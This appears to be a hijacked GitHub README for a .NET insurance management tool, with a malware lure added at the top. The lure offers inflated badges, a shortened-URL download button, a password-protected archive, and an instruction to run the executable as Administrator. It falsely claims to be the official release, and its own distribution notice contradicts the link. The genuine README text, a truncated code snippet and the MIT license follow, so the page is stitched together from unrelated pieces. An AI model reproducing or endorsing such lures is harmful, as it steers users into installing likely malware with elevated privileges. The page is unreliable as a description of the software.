<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<h1 align="center">
  <br>
  
  
            _________                                    __   
          \_   ___ \  ____   ____   ____   ____   _____/  |_ 
          /    \  \/ /  _ \ /    \ /    \_/ __ \_/ ___\   __\
          \     \___(  <_> )   |  \   |  \  ___/\  \___|  |  
           \______  /\____/|___|  /___|  /\___  >\___  >__|  
                  \/            \/     \/     \/     \/     

  
  <br>
  Connect
  <br>
</h1>

<h4 align="center">A Insurance Management Software (.NET)
.</h4>


<p align="center">
## Key Features

* Track the status of each customer easy
  - Store easy all information about your customer with the integrated database.
* Search function
* Automatic local notice when the policy has expired
* Automatic sms notice to customer phone number when the policy has expired
  - You can manually set how long before the deadline to send a reminder sms (default is 30 days before).
  - You can manually send istant sms.
  - You can manually change the default text of the sms.
  - Sms system api by TextLocal.
* Integrated Microsoft Access Database

## How To Use

You can build the project using Visual Studio (full version), or you can use the prebuild exe in the repository. Check out the code to change TextLocal API Key

```vb
Private Sub txtAuto_Click(sender As Object, e As EventArgs) Handles txtAuto.Click
        Dim uTime As Integer
        Dim Ndate As Date
        Ndate = DateAdd("m", -1, DateTimePicker1.Value)
        uTime = (Ndate - New DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds
        Dim apikey = " ------------------ your api key -------------------------"
        'MessageBox.Show(uTime)
        Dim message = txtsms.Text & TextBox6.Text
        Dim numbers = TextBox3.Text
        Dim schedule = uTime.ToString
        Dim strGet As String
        Dim senderName = txtN.Text
## Credits

Russo Giovanni M.
TextLocal


## License

MIT

---


---

MIT License

Copyright (c) 2022 Giovanni M Russo

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
